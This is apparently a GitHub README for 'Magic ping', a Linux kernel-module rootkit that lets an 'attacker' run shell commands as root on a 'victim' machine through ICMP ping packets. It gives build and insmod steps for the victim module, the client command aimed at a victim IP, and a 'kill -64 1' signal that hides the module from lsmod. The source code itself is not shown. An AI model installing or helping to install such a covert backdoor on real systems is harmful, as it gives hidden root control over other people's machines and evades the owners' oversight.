Magic ping - shell execution

<div align="center">

![Ping - ICMPv4](https://img.shields.io/badge/Ping-ICMPv4-2ea44f) ![License - MIT](https://img.shields.io/badge/License-MIT-blue) 
![Security - Post penetration](https://img.shields.io/badge/Security-Post_penetration-yellow) 

![Tested on - 5.4.0-109-generic #123-Ubuntu x86_64 GNU/Linux](https://img.shields.io/badge/Tested_on-5.4.0--109--generic_%23123--Ubuntu_x86__64_GNU%2FLinux-orange)
![Tested on - 5.13.0-40-generic #45~20.04.1-Ubuntu x86_64 GNU/Linux](https://img.shields.io/badge/Tested_on-5.13.0--40--generic_%2345~20.04.1--Ubuntu_x86__64_GNU%2FLinux-orange)
</div>

## Features:

* Romete shell command execution by ping.
* Hiding (or Showing) Kernel Module from Userspace. 

## Asciinema Demo

[![asciicast](https://asciinema.org/a/7dceXAVrCSqyaNmvfiD6L51rM.svg)](https://asciinema.org/a/7dceXAVrCSqyaNmvfiD6L51rM)

## Compile 

**compile server(victim) kernel module:**

```bash
cd server && make
```

**Client(attacker):**

```bash
cd client && make
```

**Romete server (victim):**

```
sudo insmod server.mod
```

## Local attacker:

Need root privilege to send icmp packets for ping.
```
sudo ./client <victim ip address>
```

Then you can let remote victim execute whatever shell command you input as root privilege (some command may need full path).

## Hide(Show) remote kernel module:

Send signal 64 to show or hide:
```
kill -64 1
```

Use `lsmod` to check.


## Thanks && Reference：

* [Hacking the Linux Kernel Network Stack](http://phrack.org/issues/61/13.html)
* [Does tcpdump bypass iptables?](https://superuser.com/questions/925286/does-tcpdump-bypass-iptables)
* [linux-network-programming-ping.c](https://github.com/coding-fans/linux-network-programming/blob/master/src/c/icmp/ping/ping.c)
* [Given a git commit hash, how to find out which kernel release contains it?](https://unix.stackexchange.com/questions/45120/given-a-git-commit-hash-how-to-find-out-which-kernel-release-contains-it)
* [Linux Rootkits Part 5: Hiding Kernel Modules from Userspace](https://xcellerator.github.io/posts/linux_rootkits_05/)
* [Hooking Linux Kernel Functions, Part 2: How to Hook Functions with Ftrace](https://www.apriorit.com/dev-blog/546-hooking-linux-functions-2)
